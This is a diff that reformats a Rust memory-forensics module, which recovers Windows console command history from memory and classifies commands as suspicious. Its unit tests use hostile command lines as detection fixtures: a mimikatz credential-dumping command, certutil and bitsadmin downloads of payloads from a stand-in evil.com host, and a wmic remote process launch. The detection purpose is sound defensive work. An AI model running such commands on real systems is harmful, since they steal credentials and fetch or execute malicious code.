@@ -73,7 +73,9 @@ pub fn classify_console_command(command: &str) -> bool {
     // Base64-like long argument: any token >80 chars of [A-Za-z0-9+/=]
     for token in command.split_whitespace() {
         if token.len() > 80
-            && token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
+            && token
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
         {
             return true;
         }
@@ -110,8 +112,7 @@ pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
         None => return Ok(Vec::new()),
     };
 
-    let procs = crate::process::walk_processes(reader, ps_head)
-        .unwrap_or_default();
+    let procs = crate::process::walk_processes(reader, ps_head).unwrap_or_default();
 
     let mut results = Vec::new();
 
@@ -129,13 +130,9 @@ pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
         // Use a per-process reader with the process CR3
         let proc_reader = reader.with_cr3(proc.cr3);
 
-        let cmds = extract_console_commands(
-            &proc_reader,
-            proc.pid as u32,
-            &proc.image_name,
-            peb_addr,
-        )
-        .unwrap_or_default();
+        let cmds =
+            extract_console_commands(&proc_reader, proc.pid as u32, &proc.image_name, peb_addr)
+                .unwrap_or_default();
         results.extend(cmds);
     }
 
@@ -460,7 +457,9 @@ mod tests {
     /// `mimikatz` is suspicious regardless of arguments.
     #[test]
     fn classify_mimikatz_suspicious() {
-        assert!(classify_console_command("mimikatz.exe sekurlsa::logonpasswords"));
+        assert!(classify_console_command(
+            "mimikatz.exe sekurlsa::logonpasswords"
+        ));
     }
 
     /// `procdump` against lsass is suspicious.
@@ -478,7 +477,9 @@ mod tests {
     /// `certutil -urlcache` download technique is suspicious.
     #[test]
     fn classify_certutil_suspicious() {
-        assert!(classify_console_command("certutil -urlcache -split -f http://evil.com/payload.exe"));
+        assert!(classify_console_command(
+            "certutil -urlcache -split -f http://evil.com/payload.exe"
+        ));
     }
 
     /// `powershell -enc` with encoded payload is suspicious.
@@ -490,13 +491,17 @@ mod tests {
     /// `bitsadmin /transfer` download is suspicious.
     #[test]
     fn classify_bitsadmin_suspicious() {
-        assert!(classify_console_command("bitsadmin /transfer job http://evil.com/x.exe C:\\x.exe"));
+        assert!(classify_console_command(
+            "bitsadmin /transfer job http://evil.com/x.exe C:\\x.exe"
+        ));
     }
 
     /// `wmic /node:` remote execution is suspicious.
     #[test]
     fn classify_wmic_remote_suspicious() {
-        assert!(classify_console_command("wmic /node:192.168.1.1 process call create cmd.exe"));
+        assert!(classify_console_command(
+            "wmic /node:192.168.1.1 process call create cmd.exe"
+        ));
     }
 
     /// Pattern matching is case-insensitive.
@@ -960,10 +965,10 @@ mod tests {
     /// Exercises the cr3==0||peb_addr==0 guard.
     #[test]
     fn walk_consoles_conhost_no_peb_skipped() {
-        const PS_VADDR:   u64 = 0xFFFF_8000_0019_0000;
-        const PS_PADDR:   u64 = 0x0019_0000;
-        const EPROC_VADDR:u64 = 0xFFFF_8000_0018_0000;
-        const EPROC_PADDR:u64 = 0x0018_0000;
+        const PS_VADDR: u64 = 0xFFFF_8000_0019_0000;
+        const PS_PADDR: u64 = 0x0019_0000;
+        const EPROC_VADDR: u64 = 0xFFFF_8000_0018_0000;
+        const EPROC_PADDR: u64 = 0x0018_0000;
         // Minimal ISF for process walk
         let isf = IsfBuilder::new()
             .add_struct("_LIST_ENTRY", 16)
@@ -971,14 +976,24 @@ mod tests {
             .add_struct("_EPROCESS", 512)
             .add_field("_EPROCESS", "ActiveProcessLinks", 0, "_LIST_ENTRY")
             .add_field("_EPROCESS", "UniqueProcessId", 0x10, "unsigned long long")
-            .add_field("_EPROCESS", "InheritedFromUniqueProcessId", 0x18, "unsigned long long")
+            .add_field(
+                "_EPROCESS",
+                "InheritedFromUniqueProcessId",
+                0x18,
+                "unsigned long long",
+            )
             .add_field("_EPROCESS", "ImageFileName", 0x20, "array") // 15-char name
             .add_field("_EPROCESS", "CreateTime", 0x30, "unsigned long long")
             .add_field("_EPROCESS", "ExitTime", 0x38, "unsigned long long")
             .add_field("_EPROCESS", "Peb", 0x40, "pointer")
             .add_field("_EPROCESS", "Pcb", 0, "_KPROCESS")
             .add_struct("_KPROCESS", 64)
-            .add_field("_KPROCESS", "DirectoryTableBase", 0x28, "unsigned long long")
+            .add_field(
+                "_KPROCESS",
+                "DirectoryTableBase",
+                0x28,
+                "unsigned long long",
+            )
             .add_struct("_PEB", 64)
             .add_symbol("PsActiveProcessHead", PS_VADDR)
             .build_json();
@@ -994,7 +1009,7 @@ mod tests {
         // eproc page: ActiveProcessLinks.Flink = PS_VADDR (end), peb=0
         let mut eproc_page = vec![0u8; 4096];
         eproc_page[0..8].copy_from_slice(&PS_VADDR.to_le_bytes()); // Flink = PS_HEAD (terminates)
-        // ImageFileName at 0x20 = "conhost.exe"
+                                                                   // ImageFileName at 0x20 = "conhost.exe"
         let name = b"conhost.exe\0\0\0\0";
         eproc_page[0x20..0x20 + name.len()].copy_from_slice(name);
         // Peb at 0x40 = 0 (no PEB)
@@ -1063,13 +1078,13 @@ mod tests {
     #[test]
     fn extract_console_commands_full_path_finds_suspicious_command() {
         // Everything in one page at HEAP_VADDR
-        const PEB_VADDR:  u64 = 0x0000_7FFF_0012_0000;
-        const PEB_PADDR:  u64 = 0x0012_0000;
+        const PEB_VADDR: u64 = 0x0000_7FFF_0012_0000;
+        const PEB_PADDR: u64 = 0x0012_0000;
         const HEAP_VADDR: u64 = 0x0000_7FFF_0011_0000;
         const HEAP_PADDR: u64 = 0x0011_0000;
         // Extra pages for bucket and cmd entry
-        const CMD_VADDR:  u64 = 0x0000_7FFF_0010_0000;
-        const CMD_PADDR:  u64 = 0x0010_0000;
+        const CMD_VADDR: u64 = 0x0000_7FFF_0010_0000;
+        const CMD_PADDR: u64 = 0x0010_0000;
 
         let hist_list_off: u64 = 0x40;
         // candidate at offset 0 in HEAP page:
@@ -1108,9 +1123,15 @@ mod tests {
         let cmd_entry_vaddr = CMD_VADDR + 0x100;
 
         let whoami = "whoami";
-        let whoami_utf16: Vec<u8> = whoami.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        let whoami_utf16: Vec<u8> = whoami
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
         let cmdexe = "cmd.exe";
-        let cmdexe_utf16: Vec<u8> = cmdexe.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        let cmdexe_utf16: Vec<u8> = cmdexe
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
 
         let isf = IsfBuilder::new()
             .add_struct("_PEB", 64)
@@ -1134,12 +1155,12 @@ mod tests {
         // hist_entry at 0x300:
         heap_page[0x300..0x308].copy_from_slice(&head_addr.to_le_bytes()); // Flink = head_addr
         heap_page[0x308..0x310].copy_from_slice(&head_addr.to_le_bytes()); // Blink = head_addr (consistency)
-        // Application _UNICODE_STRING at 0x310 (= 0x300 + 0x10)
+                                                                           // Application _UNICODE_STRING at 0x310 (= 0x300 + 0x10)
         let app_len = cmdexe_utf16.len() as u16;
         heap_page[0x310..0x312].copy_from_slice(&app_len.to_le_bytes()); // Length
         heap_page[0x312..0x314].copy_from_slice(&app_len.to_le_bytes()); // MaxLength
         heap_page[0x318..0x320].copy_from_slice(&app_buf_vaddr.to_le_bytes()); // Buffer
-        // CommandCount at 0x320 (= 0x300 + 0x20)
+                                                                               // CommandCount at 0x320 (= 0x300 + 0x20)
         heap_page[0x320..0x324].copy_from_slice(&1u32.to_le_bytes());
         // CommandBucket at 0x328 (= 0x300 + 0x28)
         heap_page[0x328..0x330].copy_from_slice(&bucket_ptr.to_le_bytes());
@@ -1175,12 +1196,12 @@ mod tests {
     /// is zero (unmapped PEB) → extract_console_commands returns empty.
     #[test]
     fn walk_consoles_conhost_valid_peb_no_heap() {
-        const PS_VADDR:   u64 = 0xFFFF_8000_000F_0000;
-        const PS_PADDR:   u64 = 0x000F_0000;
-        const EPROC_VADDR:u64 = 0xFFFF_8000_000E_0000;
-        const EPROC_PADDR:u64 = 0x000E_0000;
-        const PEB_VADDR:  u64 = 0x0000_7FFF_000D_0000;
-        const PEB_PADDR:  u64 = 0x000D_0000;
+        const PS_VADDR: u64 = 0xFFFF_8000_000F_0000;
+        const PS_PADDR: u64 = 0x000F_0000;
+        const EPROC_VADDR: u64 = 0xFFFF_8000_000E_0000;
+        const EPROC_PADDR: u64 = 0x000E_0000;
+        const PEB_VADDR: u64 = 0x0000_7FFF_000D_0000;
+        const PEB_PADDR: u64 = 0x000D_0000;
 
         let isf = IsfBuilder::new()
             .add_struct("_LIST_ENTRY", 16)
@@ -1188,14 +1209,24 @@ mod tests {
             .add_struct("_EPROCESS", 512)
             .add_field("_EPROCESS", "ActiveProcessLinks", 0, "_LIST_ENTRY")
             .add_field("_EPROCESS", "UniqueProcessId", 0x10, "unsigned long long")
-            .add_field("_EPROCESS", "InheritedFromUniqueProcessId", 0x18, "unsigned long long")
+            .add_field(
+                "_EPROCESS",
+                "InheritedFromUniqueProcessId",
+                0x18,
+                "unsigned long long",
+            )
             .add_field("_EPROCESS", "ImageFileName", 0x20, "array")
             .add_field("_EPROCESS", "CreateTime", 0x30, "unsigned long long")
             .add_field("_EPROCESS", "ExitTime", 0x38, "unsigned long long")
             .add_field("_EPROCESS", "Peb", 0x40, "pointer")
             .add_field("_EPROCESS", "Pcb", 0, "_KPROCESS")
             .add_struct("_KPROCESS", 64)
-            .add_field("_KPROCESS", "DirectoryTableBase", 0x28, "unsigned long long")
+            .add_field(
+                "_KPROCESS",
+                "DirectoryTableBase",
+                0x28,
+                "unsigned long long",
+            )
             .add_struct("_PEB", 64)
             .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
             .add_symbol("PsActiveProcessHead", PS_VADDR)
